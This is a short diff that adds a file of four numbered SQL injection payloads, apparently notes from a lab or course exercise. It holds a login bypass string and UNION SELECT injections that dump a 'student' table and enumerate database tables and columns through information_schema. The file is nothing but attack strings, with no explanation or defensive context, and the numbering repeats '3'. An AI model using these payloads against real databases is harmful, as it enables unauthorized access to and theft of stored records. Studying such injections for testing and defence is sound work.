@@ -1,0 +1,4 @@
+# 1. ' or 1=1;--
+# 2. ' UNION SELECT Stud_name, branch from student;--
+# 3. ' UNION SELECT table_schema, table_name from information_schema.tables;--
+# 3. ' UNION SELECT  table_name, column_name from information_schema.columns where table_name = 'student';--
